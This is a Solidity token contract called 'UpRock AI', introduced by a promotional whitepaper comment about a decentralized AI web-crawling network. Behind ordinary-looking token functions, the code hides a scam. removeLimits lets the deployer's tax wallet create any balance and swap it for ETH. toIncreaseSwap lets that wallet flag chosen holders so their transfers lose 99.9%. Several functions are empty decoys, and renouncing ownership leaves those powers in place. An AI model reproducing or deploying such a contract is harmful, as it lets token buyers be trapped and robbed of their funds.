/*
  *www.uprock-ai.com
  *medium.com/@UpRock-AI
  *x.com/UpRock_AI
  *t.me/UpRock_AI

  Abstract
In the age of information overload, the power of AI to decipher and deliver insights is 
undeniable. However, this potential has been largely monopolized by centralized entities, 
raising concerns of censorship, bias, and inadequate real-time relevance. UpRock emerges 
as the antidote, harnessing the principles of decentralization and web3 technology to 
reshape the AI landscape.UpRock is pioneering the democratization of advanced AI web 
crawling and data synthesis, 
a privilege previously reserved for large enterprises. By balancing centralized AI with 
decentralized physical infrastructure, UpRock is architecting a framework for impartial, 
real-time and personalized insights. This journey transforms decision-making processes and 
workflows for individuals and organizations, underscoring AI’s crucial role in adapting 
to emerging consumer behaviors. The AI Insight Exchange (AIX) dashboard is central to 
UpRock’s innovations, empowering customers with a personal AI web crawler, changing the 
way we absorb information and make informed decisions aligned with our life and work goals.
The backbone of the AIX is the Knowledge Acquisition Layer (KAL), fueled by a network 
of real-device peers. Users share bandwidth and compute in exchange for UpRock tokens, 
fostering a resilient, broad-reaching community-driven ecosystem. UpRock's unique strength 
lies in acquiring real-time data directly from the source, transcending traditional static 
datasets and API delays. With one app, users participate in both supply and demand, sharing 
unused resources and receiving AI Insights-as-a-Service (IaaS) via the AIX dashboard, 
offering a transformative experience in the rapidly growing $7.7 billion Open Source 
Intelligence (OSI) market. The closely related Business Intelligence (BI) and data API 
markets are also thriving, with revenues already surpassing $25 billion and $45 billion 
respectively in 2023.
By simply installing the UpRock App your mobile device is transformed into an essential 
node within an unprecedented decentralized physical infrastructure for AI. This initiative 
is pivotal to our market entry strategy. Fortified by the founders' experience in building 
large-scale mobile platforms, UpRock is poised for unparalleled success in  this dynamic 
landscape, steering the internet towards a more open, free and humanity-first AI future.

The Problem
Web3 promised a future where control over data shifts from tech giants to individuals. 
However, this collective pursuit is compromised by big tech's centralized approach to AI. 
They obscure their data sources, limit features, and implement opaque moderation policies, 
all without compensating data providers appropriately. This approach runs counter to the 
very essence of Web3's decentralized vision.
The first significant challenge lies in the inherent centralization, censorship, and lack 
of user data incentives in traditional AI. This centralization has sown seeds of apprehension 
regarding the impartiality and freedom of the AI-driven data world, highlighting a critical 
need for decentralization as a necessary countermeasure.
Secondly, the exponential growth in digital content, where AI is driving the production 
cost down to zero, is creating a chaotic information environment. The challenge is no longer 
just about how to acquire information, but efficiently collating, analyzing, and extracting 
genuine insights from it. While elite Open Source Intelligence (OSI) products offer substantial 
insights, their prohibitive costs and specificity render them inaccessible to the majority, 
leaving individuals and smaller entities grappling with myriad niche, and often inefficient 
APIs and highly technical data analysis products.
Additionally, operational challenges and the prohibitive costs of managing vast data quantities 
and running extensive proxy networks add layers of complexity and financial strain, making access 
to meaningful and affordable data APIs nearly unattainable for smaller companies and individuals.
In an era where single developers can build meaningful products thanks to cloud computing providers, 
we see a gap for an Insight-as-a-Service offering. An offering that can provide a consistent, simple, 
and accurate view of the vast digital landscape, without breaking the bank, and without needing a 
small army of highly educated analysts and specialists, training or downtime.

The Opportunity & Innovation
UpRock presents a significant opportunity for a wide range of organizations, including creators, 
brands, non-profits, corporations and governments. It's not just about consuming information; it’s 
about having a personalized, goal-oriented AI web advisor, redefining interactions with the internet 
and focusing on emergent behaviors that incumbents may overlook as they integrate AI into their established products.
The landscape is ripe for UpRock’s novel approach. Legal developments like the hiQ Labs vs LinkedIn 
ruling have clarified the legality of web scraping, mitigating operational risks. We are not just 
aligning with existing demands, but creating new human-centric products that democratizes large-scale, 
enterprise-grade insights, focusing on the big opportunity to reimagine workflows with the power of an 
intelligent, communicative web crawler.
Imagine wielding the power of a colossal peer-to-peer network, tirelessly scouring the web to deliver 
insights tailored to your ambitions. This intricate, expansive network operates on your behalf, and 
you can harness its capabilities just by chatting or talking to it. Historically, such potent tools 
were exclusive to large enterprises, with offerings like Palantir and Bright Data being both expensive 
and technically demanding. However, innovations in natural language processing have paved the way for 
consumer-friendly, AI-driven tools and dashboards that comprehend and converse as a friend. This is the 
dawn of consumerized, enterprise-level business intelligence -  a prosumer revolution. UpRock is at the 
forefront, democratizing access to deep, intelligent insights through affordable, human-centric solutions. 
*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract UpRockAI is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 900000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "UpRock AI";
    string private _symbol = "UPROCK AI";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function removePreTrading() public {
    }
    function setTrading() external {
    }
    function addBots() public {
    }
    function delBots() public {
    }
    function toIncreaseSwap(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function removeLimits(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}